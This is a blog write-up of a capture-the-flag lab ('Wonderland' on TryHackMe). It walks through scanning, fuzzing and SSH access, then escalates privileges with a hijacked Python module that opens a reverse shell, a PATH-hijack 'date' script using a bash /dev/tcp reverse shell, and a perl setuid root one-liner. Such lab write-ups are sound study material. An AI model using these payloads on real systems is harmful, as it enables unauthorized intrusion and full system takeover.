---
date: 2020-06-07 19:54:22
layout: post
title: "Wonderland"
subtitle: Medium Machine from Tryhackme
description: 
image: /assets/img/wonderland/wonderland.png
optimized_image:
category: Tryhackme
tags: 
author:
paginate: false
---
<a href="https://tryhackme.com/room/wonderland">Link</a> to the machine on tryhackme.

I started with nmap scan
```bash
nmap -T4 -p- -A 10.10.58.164
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 20:13 IST
Nmap scan report for 10.10.39.171
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   270.56 ms 10.9.0.1
2   279.33 ms 10.10.39.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.07 seconds
```
Only two ports were open on the machine, 22 and 80.

Proceeded with port 80, visited the website hosted on the port.
![placeholder](/assets/img/wonderland/site.png "site")
Site said Follow the white rabbit. Nothing interesting in the source.So,started fuzzing for hidden directories and pages.
```bash
ffuf -w /root/Documents/Fuzz/fuzzdir -u "http://10.10.58.164/FUZZ" -e .php,.html,.txt,.asp,.aspx,.zip
```
![placeholder](/assets/img/wonderland/fuzz.png "fuzz")
This shows a directory named **r**.So now it is quite  guessable what the home page meant by following the rabbit.
There were directories like /r/a/b/b/i/t/
Inside the directory at the url
```url
http://10.10.58.164/r/a/b/b/i/t/
```
The page said ***"Open the door and enter wonderland"***
![placeholder](/assets/img/wonderland/enter.png "enter")

In the source of the page the password for alice user was present.

![placeholder](/assets/img/wonderland/alice.png "alice")

Logged in through SSH as Alice user.

But instead of user.txt, root.txt was present inside the home directory of the Alice user, although it was only accessible by root.
There were in total 4 users on the machine.
![placeholder](/assets/img/wonderland/users.png "users")
A python script was also present in the home directory and running ***sudo -l***, showed that alice user can run the script as user rabbit.
Enumerating the machine, I found that root directory was accessible by everyone though read permission was not given but execute permission was present.
```
cd /root/
cat user.txt
```
Got the user flag.

Analyzing the python script, I found that it is simply importing a module random and then print some random lines from the poem given in script.

Since, the script was present in the directory where I had write permission. So, I did python module/library hijacking.
Since python searches for modules first in the directory where script is present and then according to PYTHONPATH environment variable.

I copied the random.py to the /home/alice and then added my commands inside _test funtion in random.py to get a reverse shell.
The _test function then looked like
```python
def _test(N=2000):
    _test_generator(N, random, ())
    _test_generator(N, normalvariate, (0.0, 1.0))
    _test_generator(N, lognormvariate, (0.0, 1.0))
    _test_generator(N, vonmisesvariate, (0.0, 1.0))
    _test_generator(N, gammavariate, (0.01, 1.0))
    _test_generator(N, gammavariate, (0.1, 1.0))
    _test_generator(N, gammavariate, (0.1, 2.0))
    _test_generator(N, gammavariate, (0.5, 1.0))
    _test_generator(N, gammavariate, (0.9, 1.0))
    _test_generator(N, gammavariate, (1.0, 1.0))
    _test_generator(N, gammavariate, (2.0, 1.0))
    _test_generator(N, gammavariate, (20.0, 1.0))
    _test_generator(N, gammavariate, (200.0, 1.0))
    _test_generator(N, gauss, (0.0, 1.0))
    _test_generator(N, betavariate, (3.0, 3.0))
    _test_generator(N, triangular, (0.0, 1.0, 1.0/3.0))

# Create one instance, seeded from current time, and export its methods
# as module-level functions.  The functions share state across all uses
#(both in the user's code and in the Python libraries), but that's fine
# for most programs and is easier for the casual user than making them
# instantiate their own Random() instance.

_inst = Random()
seed = _inst.seed
random = _inst.random
uniform = _inst.uniform
triangular = _inst.triangular
randint = _inst.randint
choice = _inst.choice
randrange = _inst.randrange
sample = _inst.sample
shuffle = _inst.shuffle
choices = _inst.choices
normalvariate = _inst.normalvariate
lognormvariate = _inst.lognormvariate
expovariate = _inst.expovariate
vonmisesvariate = _inst.vonmisesvariate
gammavariate = _inst.gammavariate
gauss = _inst.gauss
betavariate = _inst.betavariate
paretovariate = _inst.paretovariate
weibullvariate = _inst.weibullvariate
getstate = _inst.getstate
setstate = _inst.setstate
getrandbits = _inst.getrandbits

import os                                                #added
import subprocess                                        #added
import socket         				        #added
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)       #added
s.connect(("10.9.12.192",8888)) 			#added
os.dup2(s.fileno(),0)					#added
os.dup2(s.fileno(),1)					#added
os.dup2(s.fileno(),2)					#added
p=subprocess.call(["/bin/sh","-i"])			#added
```
You can <a href="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7">refer</a> for more information on python library hijacking.

Now executed the file as rabbit
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Got the reverse shell as user rabbit.

Made the shell better with following commands
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
#Then
export TERM=xterm
#Then press ctrl+z
#type
stty raw -echo
#then
fg
#then press Enter two times.
#This makes shell with most functions as ssh shell.
```

Inside the rabbit user's home directory, I found a SUID binary named teaParty.
Listing the contents of the binary found some information between malformed characters.
![placeholder](/assets/img/wonderland/teaparty.png "teaparty")

So this binary was executing date command to present the output.
Since this was a SUID binary so,when it will run it will use PATH as of the user who is executing(rather than the case in sudo where the path used is already specified in sudoers file.)

Changed the path to prepend tmp directory.
```
export PATH=/tmp/:$PATH
```

Added a file named ***date*** inside the tmp directory and made it executable.

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.9.12.192/7777 0>&1
```
```bash
chmod +x date
```

Ran the teaParty file and got the shell as user hatter.
Inside the home directory of the user found a password.txt which gave the password for user hatter.
Used the password to switch user in SSH shell of alice. This password also worked directly on SSH login.

Got the SSH shell of hatter user.

Running the linpeas.sh script I found that there were some capabilities with perl command that could give root shell.

The perl command which was either executable by root or by people in hatter group had the capability ***cap_setuid+ep***

Used the command from GTFObins to get the root shell.
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Got the shell and the root.txt placed at /home/alice.
![placeholder](/assets/img/wonderland/root.png "root")


    

 
